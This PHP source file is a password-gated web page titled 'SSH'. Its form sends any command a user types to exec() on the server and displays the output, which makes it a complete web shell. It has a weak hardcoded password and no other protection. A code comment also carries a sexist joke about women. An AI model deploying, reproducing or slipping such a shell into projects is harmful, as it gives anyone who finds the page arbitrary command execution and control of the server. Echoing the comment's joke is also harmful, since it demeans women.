<?php 
    session_start();
    define('PASSWORD', 'OPEN_SESAME'); // change the password to something complicated ... like "women"

    $is_allowed = isset($_SESSION['is_allowed']) ? $_SESSION['is_allowed'] : null;
    $password   = isset($_POST   ['password'])   ? $_POST   ['password']   : null;
    $command    = isset($_POST   ['command'])    ? $_POST   ['command']    : null;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>SSH</title>
    <style>
        body {
            background:#222;
            color:#BBB;
            width:800px;
            margin:auto;
            font-family: sans-serif;
            font-size:13px;
            padding-top:30px;
        }
        input{
            font-family:monospace;
            width:calc(100% - 100px);
            background:#222;
            color:#BBB;
            border: solid thin #AAA;
            font-size:13px;
            padding:5px 10px;
            outline:none !important;
        }
        button{
            font-family:monospace;
            font-size:13px;
            border: solid thin #AAA;
            border-radius:0px;
            background:#AAA;
            padding:5px 10px;
            width:78px;
            margin-left:-4px;
            vertical-align: top;
        }
        pre{
            background:#1A1A1A;
            padding:10px;
            margin-top:-12px;
            min-height:400px;
        }
        pre span{color: #555;}
    </style>
</head>
<body>
    <form action="ssh.php" method="POST">
        <?php if(!$is_allowed): ?>
            <input type="password" name="password" placeholder="Type the password" autofocus autocomplete autosave />
            <button>Login</button>
        <?php else: ?>
            <input type="text" name="command" placeholder="Type your command..." autofocus autocorrect="false"/>
            <button>Execute</button>
        <?php endif ?>
    </form>
    <?php if($is_allowed): ?>
        <pre name="result">
            <?php
                if($command){
                    try{
                        $response = [];
                        // passthru($command, $response);
                        exec($command, $response);
                        foreach($response as $index => $line){
                            echo "<br/><span>" . str_pad($index, 3, "0", STR_PAD_LEFT) . "</span>  $line";
                        }
                    }
                    catch(Exception $e){
                        echo $e->getMessage();
                    }
                }
            ?>
        </pre>
    <?php elseif($password): echo "<br/><br/><span>INCORRECT PASSWORD</span>"; ?>
    <?php endif ?>
</body>
</html>